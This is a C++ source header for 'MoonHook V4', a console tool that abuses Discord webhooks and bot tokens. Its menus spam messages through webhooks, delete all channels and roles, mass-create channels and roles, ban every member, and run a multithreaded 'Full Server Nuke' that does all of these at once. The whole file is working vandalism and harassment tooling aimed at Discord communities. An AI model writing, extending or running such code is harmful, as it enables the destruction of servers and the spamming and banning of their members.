// internal_options.hpp
// All the Moonhook built-in functions and options live here.

#pragma once

#include <functional>
#include <iostream>
#include <thread>
#include <chrono>
#include <atomic>
#include <csignal>
#include <future>

#include <console.hpp>
#include <option.hpp>
#include <ansi_terminal.hpp>

#include <webhook.hpp>
#include <bot.hpp>

namespace InternalOptions {
    Option Webhooks = {
        "Webhooks",
        [](ConsoleHelper* console) -> void {
            std::string WEBHOOK_URL = console->input("Webhook URL: ");

            console->log("Initializing webhook...");
            moon::Webhook hook(WEBHOOK_URL);

            const std::string WEBHOOK_NAME = hook.get_name();
            if (WEBHOOK_NAME.empty())
            {
                console->error("This webhook appears to be non-existent or broken. get_name() error: " + hook.last_error());
                ansi::pause();
                return;
            }

            const std::string WebhooksBanner = R"(
██╗    ██╗███████╗██████╗ ██╗  ██╗ ██████╗  ██████╗ ██╗  ██╗███████╗
██║    ██║██╔════╝██╔══██╗██║  ██║██╔═══██╗██╔═══██╗██║ ██╔╝██╔════╝
██║ █╗ ██║█████╗  ██████╔╝███████║██║   ██║██║   ██║█████╔╝ ███████╗
██║███╗██║██╔══╝  ██╔══██╗██╔══██║██║   ██║██║   ██║██╔═██╗ ╚════██║
╚███╔███╔╝███████╗██████╔╝██║  ██║╚██████╔╝╚██████╔╝██║  ██╗███████║
 ╚══╝╚══╝ ╚══════╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝
        MoonHook V4
            )";

//---------------------------------- SUB OPTIONS -------------------------------------------------//
            std::vector<Option> sub_options = {
                {
                    "Send Message",
                    [&hook](ConsoleHelper* c) -> void {
                        std::string TEXT = c->input("Text to send: ");
                        bool success = hook.send(TEXT);
                        if (success)
                        {
                            c->log("Sent successfully!");
                        } else {
                            c->error("Failed to send webhook! Error: " + hook.last_error());
                        }
                    }
                },
                {
                    "Spam Webhook",
                    [&hook](ConsoleHelper* c) -> void {
                        std::string TEXT = c->input("Text to spam: ");
                        int DELAY = c->int_input("Delay (seconds): ");
                        if (DELAY <= 0) DELAY = 1;

                        static std::atomic<bool> g_spamming{true};
                        g_spamming = true;

                        std::signal(SIGINT, [](int) {
                            g_spamming = false;
                        });

                        c->log("Spamming... Press CTRL+C to stop.");

                        std::thread t([&]() {
                            while (g_spamming)
                            {
                                bool resp = hook.send(TEXT);
                                if (resp)
                                {
                                    c->log("Sent successfully!");
                                } else {
                                    c->error("Failed to send! Error: " + hook.last_error());
                                }
                                std::this_thread::sleep_for(std::chrono::seconds(DELAY));
                            }
                            c->log("Stopped spamming.");
                        });

                        t.join();
                    }
                },
                {
                    "Set Webhook Name",
                    [&hook](ConsoleHelper* c) -> void {
                        std::string NAME = c->input("New webhook name: ");
                        c->log("Attempting to set webhook name...");
                        bool success = hook.set_name(NAME);
                        if (success)
                        {
                            c->log("Success!");
                        } else {
                            c->error("Failed to set webhook name! Error: " + hook.last_error());
                        }
                    }
                },
                {
                    "Set Webhook Avatar",
                    [&hook](ConsoleHelper* c) -> void {
                        int file_or_url = c->int_input("Set from file or URL? (1-file, 2-url): ");
                        std::string source = c->input("Source (path or URL): ");

                        c->log("Attempting to set avatar...");

                        bool success = false;
                        if (file_or_url == 1)
                        {
                            success = hook.set_avatar_from_file(source);
                        } else if (file_or_url == 2)
                        {
                            success = hook.set_avatar_from_url(source);
                        } else {
                            c->error("Invalid option! Expected 1 for file or 2 for URL.");
                            return;
                        }

                        if (success)
                        {
                            c->log("Success!");
                        } else {
                            c->error("Failed! Error: " + hook.last_error());
                        }
                    }
                },
                {
                    "Delete Webhook",
                    [&hook, &WEBHOOK_NAME](ConsoleHelper* c) -> void {
                        std::string confirmation = c->input("Are you sure you want to delete \"" + WEBHOOK_NAME + "\"? (Y/n): ");
                        if (confirmation == "Y" || confirmation == "y")
                        {
                            c->log("Attempting to delete...");
                            bool result = hook.delete_webhook();
                            if (result)
                            {
                                c->log("Deleted! Returning to main menu...");
                                ansi::pause();
                                ansi::clearConsole();
                                throw RestartException();
                            } else {
                                c->error("Failed! Error: " + hook.last_error());
                            }
                        } else {
                            c->log("Cancelled.");
                        }
                    }
                }
            };
//------------------------------------------------------------------------------------------------//

            while (true)
            {
                ansi::clearConsole();
                ansi::print_gradient_ascii(WebhooksBanner, console->gmain);
                std::cout << "Webhook: " << WEBHOOK_NAME << "\n\n";

                for (size_t i = 0; i < sub_options.size(); i++)
                {
                    std::cout << "  " << (i + 1) << ". " << sub_options[i].name << "\n";
                }
                std::cout << "  " << (sub_options.size() + 1) << ". Back\n\n";

                std::cout << ansi::rgb_to_ansi(255, 255, 0)
                          << "Select an option (1-" << (sub_options.size() + 1) << "): "
                          << ansi::ColorReset();

                std::string selection;
                std::getline(std::cin, selection);

                int idx = -1;
                try {
                    idx = std::stoi(selection) - 1;
                } catch (...) {}

                if (idx < 0 || idx > (int)sub_options.size())
                {
                    console->error("Invalid selection!");
                    ansi::pause();
                    continue;
                }

                if (idx == (int)sub_options.size())
                {
                    return;
                }

                try {
                    sub_options[idx].run(console);
                } catch (const RestartException&) {
                    throw; 
                } catch (...) {
                    console->error("Option encountered an error!");
                }

                ansi::pause();
            }
        }
    };

    Option Bots = {
        "Bots",
        [](ConsoleHelper* console) -> void {
            std::string BOT_TOKEN = console->input("Bot token: ");
            std::string GUILD_ID = console->input("Guild ID: ");

            console->log("Initializing bot...");
            moon::DiscordBot bot(BOT_TOKEN);
            
            const std::string GUILD_NAME = bot.validate_guild(GUILD_ID);
            if (GUILD_NAME.empty())
            {
                console->error("Invalid guild ID or bot token! Error: "+bot.last_error());
                ansi::pause();
                return;
            }

            const std::string BotsBanner = R"(
██████╗  ██████╗ ████████╗███████╗
██╔══██╗██╔═══██╗╚══██╔══╝██╔════╝
██████╔╝██║   ██║   ██║   ███████╗
██╔══██╗██║   ██║   ██║   ╚════██║
██████╔╝╚██████╔╝   ██║   ███████║
╚═════╝  ╚═════╝    ╚═╝   ╚══════╝
        MoonHook V4
            )";

//---------------------------------- SUB OPTIONS -------------------------------------------------//
            std::vector<Option> sub_options = {
                {
                    "Delete All Channels",
                    [&bot, &GUILD_NAME, &GUILD_ID](ConsoleHelper* c) -> void {
                        std::string confirmation = c->input("Are you sure you want to delete all channels in '"+GUILD_NAME+"'? (Y/n): ");
                        if (confirmation == "Y" || confirmation == "y")
                        {
                            static std::atomic<bool> g_running{true};
                            g_running = true;

                            std::signal(SIGINT, [](int) {
                                g_running = false;
                            });

                            std::vector<moon::DiscordBot::Channel> channels = bot.get_channels(GUILD_ID);
                            for (moon::DiscordBot::Channel ch : channels)
                            {
                                if (!g_running)
                                {
                                    c->log("Interrupted! Stopping...");
                                    break;
                                }
                                c->log("Attempting to delete channel: "+ch.name);
                                bool result = bot.delete_channel(ch.id);
                                if (result)
                                {
                                    c->log("Success!");
                                } else {
                                    c->error("Failed to delete channel! Error: "+bot.last_error());
                                }
                            }
                            c->log(g_running ? "Finished!" : "Cancelled by user.");
                        } else {
                            c->log("Cancelled.");
                        }
                    }
                },
                {
                    "Spam Create Channels",
                    [&bot, &GUILD_ID](ConsoleHelper* c) -> void {
                        std::string channel_name = c->input("Name of channels to create: ");
                        int amount = c->int_input("Amount of channels to create: ");

                        static std::atomic<bool> g_running{true};
                        g_running = true;

                        std::signal(SIGINT, [](int) {
                            g_running = false;
                        });

                        c->log("Attempting to create channels... Press CTRL+C to stop.");
                        for (int i = 0; i < amount; i++)
                        {
                            if (!g_running)
                            {
                                c->log("Interrupted! Stopping...");
                                break;
                            }
                            c->log("Creating channel...");
                            bool success = bot.create_text_channel(GUILD_ID, channel_name);
                            if (success)
                            {
                                c->log("Successfully created channel #"+std::to_string(i+1)+"!");
                            } else {
                                c->error("Failed to create channel #"+std::to_string(i+1)+"! Error: "+bot.last_error());
                            }
                        }
                        c->log(g_running ? "Finished!" : "Cancelled by user.");
                    }
                },
                {
                    "Delete All Roles",
                    [&bot, &GUILD_ID](ConsoleHelper* c) -> void {
                        std::string confirmation = c->input("Are you sure you want to delete all roles? (Y/n): ");
                        if (confirmation == "Y" | confirmation == "y")
                        {
                            std::vector<moon::DiscordBot::Role> all_roles = bot.get_roles(GUILD_ID);
                            c->log("Attempting to delete! Press CTRL + C to stop.");
                            static std::atomic<bool> g_running = true;
                            std::signal(SIGINT, [](int) {
                                g_running = false;
                            });
                            for (moon::DiscordBot::Role rrr : all_roles)
                            {
                                if (!g_running)
                                {
                                    c->log("Stopped spamming.");
                                    break;
                                }
                                c->log("Attempting to delete role: '"+rrr.name+"'...");
                                bool success = bot.delete_role(GUILD_ID, rrr.id);
                                if (success)
                                {
                                    c->log("Successfully deleted role: "+rrr.name);
                                } else {
                                    c->error("Failed to delete role '"+rrr.name+"'! Error: "+bot.last_error());
                                }
                            }
                            c->log(g_running? "Finished." : "Cancelled by user.");
                        } else {
                            c->log("Cancelled.");
                        }
                    }
                },
                {
                    "Role Spam",
                    [&bot, &GUILD_ID](ConsoleHelper* c) -> void {
                        std::string role_name = c->input("Name of roles to create: ");
                        int role_amount = c->int_input("Amount of roles to create: ");
                        c->log("Starting to spam! Press CTRL + C to stop.");
                        static std::atomic<bool> g_running = true;
                        std::signal(SIGINT, [](int) {
                            g_running = false;
                        });
                        for (int i = 0; i < role_amount; i++)
                        {
                            if (!g_running)
                            {
                                c->log("Interrupted! Stopping...");
                                break;
                            }
                            c->log("Attempting to make role #"+std::to_string(i + 1)+"...");
                            bool success = bot.create_role(GUILD_ID, role_name);
                            if (success)
                            {
                                c->log("Successfully created role #"+std::to_string(i + 1));
                            }
                        }
                        c->log(g_running ? "Finished." : "Cancelled by user.");
                    }
                },
                {
                    "Message Spam",
                    [&bot, &GUILD_ID](ConsoleHelper* c) -> void {
                        std::string msg_content = c->input("Message to spam: ");
                        std::string hook_name = c->input("Webhook names: ");
                        int spam_delay = c->int_input("Spam delay: ");
                        if (spam_delay == 0) spam_delay = 1;
                        c->log("Getting channels...");
                        std::vector<moon::DiscordBot::Channel> all_channels = bot.get_channels(GUILD_ID);
                        if (all_channels.size() <= 0)
                        {
                            c->error("Error! No channels were found in the guild. Maybe create some first?");
                            return;
                        }
                        c->log("Creating webhooks...");
                        std::vector<moon::Webhook> created_hooks = {};
                        for (moon::DiscordBot::Channel ch : all_channels)
                        {
                            if (ch.type != 0) continue;
                            moon::DiscordBot::WebhookInfo newhook = bot.create_webhook(ch.id, hook_name);
                            if (!newhook.url().empty())
                            {
                                moon::Webhook fhook(newhook.url());
                                created_hooks.push_back(fhook);
                                c->log("Created webhook in channel '"+ch.name+"'");
                            } else {
                                c->error("Failed to create webhook in channel '"+ch.name+"'! Error: "+bot.last_error());
                            }
                        }
                        c->log("Finished creating webhooks. Beginning to spam!");
                        c->log("Press CTRL + C to stop spamming.");
                        static std::atomic<bool> g_running = true;
                        std::signal(SIGINT, [](int) {
                            g_running = false;
                        });
                        std::vector<std::future<void>> threads;
                        for (moon::Webhook hook : created_hooks)
                        {
                            threads.push_back(std::async(std::launch::async, [&]() {
                                c->log("Spawned thread!");
                                while (true)
                                {
                                    if (!g_running)
                                    {
                                        c->log("Interrupted! Killing this thread.");
                                        break;
                                    }
                                    bool success = hook.send(msg_content);
                                    if (success)
                                    {
                                        c->log("Successfully sent message!");
                                    } else {
                                        c->error("Failed to send message! Error: "+hook.last_error());
                                    }
                                    std::this_thread::sleep_for(std::chrono::seconds(spam_delay));
                                }
                            }));
                        }
                        for (auto& f : threads)
                            f.get();
                        c->log("All threads finished.");
                    }
                },
                {
                    "Ban Everyone",
                    [&bot, &GUILD_ID](ConsoleHelper* c) -> void {
                        std::string reason = c->input("Reason to ban: ");
                        std::string confirmation = c->input("Are you sure you want to ban everyone? (Y/n): ");
                        if (confirmation == "Y" || confirmation == "y")
                        {
                            c->log("Getting members...");
                            std::vector<moon::DiscordBot::Member> all_members = bot.get_members(GUILD_ID, "000000"); // uhh ill add automatic owner detection later
                            c->log("Attempting to ban everyone...");
                            static std::atomic<bool> g_running = true;
                            std::signal(SIGINT, [](int) {
                                g_running = false;
                            });
                            for (moon::DiscordBot::Member m : all_members)
                            {
                                if (!g_running)
                                {
                                    c->log("Interrupted! Stopping...");
                                    break;
                                }
                                /*if (m.is_owner)
                                {
                                    c->log("Skipping owner!");
                                    continue;
                                }*/
                                c->log("Attempting to ban member: "+m.username+"...");
                                bool success = bot.ban_member(GUILD_ID, m.user_id, reason);
                            }
                            c->log(g_running ? "Finished." : "Cancelled by user.");
                        } else {
                            c->log("Cancelled.");
                        }
                    }
                },
                {
                    "⚠️ Full Server Nuke",
                    [&bot, &GUILD_ID](ConsoleHelper* c) -> void {
                        c->log("⚠️ This option will delete and spam roles, channels, spam messages in every channel and basically destroy the entire server.");
                        std::string msgcontent = c->input("Text to spam: ");
                        std::string channel_name = c->input("Name of channels to create: ");
                        std::string role_name = c->input("Name of roles to create: ");
                        int amount = c->int_input("Amount of channels and roles to create: ");
                        int delay = c->int_input("Spam delay: ");
                        std::string confirmation = c->input("Are you SURE you want to nuke this server? This action CANNOT be undone. (Y/n): ");
                        if (confirmation != "Y" && confirmation != "y") {
                            c->log("Cancelled.");
                            return;
                        }
                        c->log("Starting full server nuke... (This might take some time, so give it some time.)");
                        c->log("Press CTRL + C to stop nuking. (This will only stop more damage from being done, not revert it.)");
                        static std::atomic<bool> g_running = true;
                        std::signal(SIGINT, [](int) {
                            g_running = false;
                        });
                        
                        std::vector<std::future<void>> threads = {};

                        const std::vector<moon::DiscordBot::Channel> orig_channels = bot.get_channels(GUILD_ID);
                        const std::vector<moon::DiscordBot::Role> orig_roles = bot.get_roles(GUILD_ID);
                        
                        threads.push_back(std::async(std::launch::async, [&]() {
                            c->log("Spawned channel deletion thread.");
                            for (moon::DiscordBot::Channel ch : orig_channels)
                            {
                                if (!g_running)
                                {
                                    c->log("Interrupted! Killing channel deletion thread.");
                                    break;
                                }
                                c->log("Attempting to delete channel: "+ch.name+"...");
                                bool success = bot.delete_channel(ch.id);
                                if (success)
                                {
                                    c->log("Successfully deleted channel: "+ch.name);
                                } else {
                                    c->error("Failed to delete channel '"+ch.name+"'! Error: "+bot.last_error());
                                }
                            }
                            c->log("Channel deletion thread finished.");
                        }));
                        threads.push_back(std::async(std::launch::async, [&]() {
                            c->log("Spawned channel creation thread.");
                            for (int i = 0; i < amount; i++)
                            {
                                if (!g_running)
                                {
                                    c->log("Interrupted! Killing channel creaton thread.");
                                    break;
                                }
                                c->log("Attempting to create channel #"+std::to_string(i + 1)+"...");
                                bool success = bot.create_text_channel(GUILD_ID, channel_name);
                                if (success)
                                {
                                    c->log("Successfully created channel #"+std::to_string(i + 1));
                                } else {
                                    c->error("Failed to create channel #"+std::to_string(i + 1)+"! Error: "+bot.last_error());
                                }
                            }
                            c->log("Channel creation thread finished.");
                        }));
                        threads.push_back(std::async(std::launch::async, [&]() {
                            c->log("Spawned role deletion thread.");
                            for (moon::DiscordBot::Role rrr : orig_roles)
                            {
                                if (!g_running)
                                {
                                    c->log("Interrupted! Killing role deletion thread.");
                                    break;
                                }
                                c->log("Attempting to delete role: "+rrr.name);
                                bool success = bot.delete_role(GUILD_ID, rrr.id);
                                if (success)
                                {
                                    c->log("Successfully deleted role '"+rrr.name+"'!");
                                } else {
                                    c->error("Failed to delete role '"+rrr.name+"'! Error: "+bot.last_error());
                                }
                            }
                            c->log("Role deletion thread finished.");
                        }));
                        threads.push_back(std::async(std::launch::async, [&]() {
                            c->log("Spawned role creation thread.");
                            for (int i = 0; i < amount; i++)
                            {
                                if (!g_running)
                                {
                                    c->log("Interrupted! Killing role creation thread.");
                                    break;
                                }
                                c->log("Attempting to create role #"+std::to_string(i + 1)+"...");
                                bool success = bot.create_role(GUILD_ID, role_name);
                                if (success)
                                {
                                    c->log("Successfully created role #"+std::to_string(i + 1)+"!");
                                } else {
                                    c->error("Failed to create role #"+std::to_string(i + 1)+"! Error: "+bot.last_error());
                                }
                            }
                            c->log("Finished role creation thread.");
                        }));
                        threads.push_back(std::async(std::launch::async, [&]() {
                            c->log("Spawned main message spamming thread.");
                            c->log("Waiting for all channels to be created before creating webhooks.");
                            threads[1].get();
                            c->log("Channel creation thread finished! Beginning to create webhooks.");
                            const std::vector<moon::DiscordBot::Channel> all_channels = bot.get_channels(GUILD_ID);
                            std::vector<moon::Webhook> created_hooks = {};
                            for (moon::DiscordBot::Channel ch : all_channels)
                            {
                                if (!g_running)
                                {
                                    c->log("Interrupting. Killing webhook creation thread.");
                                    break;
                                }
                                if (ch.type != 0) continue;
                                c->log("Attempting to create a webhook in channel: "+ch.name+"...");
                                moon::DiscordBot::WebhookInfo hookinfo = bot.create_webhook(ch.id, role_name);
                                if (!hookinfo.url().empty())
                                {
                                    c->log("Successfully created a webhook in channel: "+ch.name);
                                    moon::Webhook hook(hookinfo.url());
                                    created_hooks.push_back(hook);
                                } else {
                                    c->error("Failed to create webhook in channel '"+ch.name+"'! Error: "+bot.last_error());
                                }
                            }
                            c->log("Finished creating webhooks");
                            c->log("Creating message spam threads.");
                            for (moon::Webhook hook : created_hooks)
                            {
                                threads.push_back(std::async(std::launch::async, [&]() {
                                    c->log("Started message spam subthread!");
                                    while (true)
                                    {
                                        if (!g_running)
                                        {
                                            c->log("Interrupted! Killing message spam subthread.");
                                            break;
                                        }
                                        bool success = hook.send(msgcontent);
                                        if (success)
                                        {
                                            c->log("Successfully sent message!");
                                        } else {
                                            c->error("Failed to send message! Error: "+hook.last_error());
                                        }
                                        std::this_thread::sleep_for(std::chrono::seconds(delay));
                                    }
                                    c->log("Finished message spam subthread.");
                                }));
                            }
                            c->log("Finished main message spamming thread.");
                        }));
                        for (auto& f : threads)
                            f.get();

                        c->log("Full server nuke stopped / finished.");
                    }
                }
            };
//------------------------------------------------------------------------------------------------//

            while (true)
            {
                ansi::clearConsole();
                ansi::print_gradient_ascii(BotsBanner, console->gmain);
                std::cout << "Guild Name: " << GUILD_NAME << "\n\n";

                for (size_t i = 0; i < sub_options.size(); i++)
                {
                    std::cout << "  " << (i + 1) << ". " << sub_options[i].name << "\n";
                }
                std::cout << "  " << (sub_options.size() + 1) << ". Back\n\n";

                std::cout << ansi::rgb_to_ansi(255, 255, 0)
                          << "Select an option (1-" << (sub_options.size() + 1) << "): "
                          << ansi::ColorReset();

                std::string selection;
                std::getline(std::cin, selection);

                int idx = -1;
                try {
                    idx = std::stoi(selection) - 1;
                } catch (...) {}

                if (idx < 0 || idx > (int)sub_options.size())
                {
                    console->error("Invalid selection!");
                    ansi::pause();
                    continue;
                }

                if (idx == (int)sub_options.size())
                {
                    return;
                }

                try {
                    sub_options[idx].run(console);
                } catch (const RestartException&) {
                    throw; 
                } catch (...) {
                    console->error("Option encountered an error!");
                }

                ansi::pause();
            }
        }
    };
}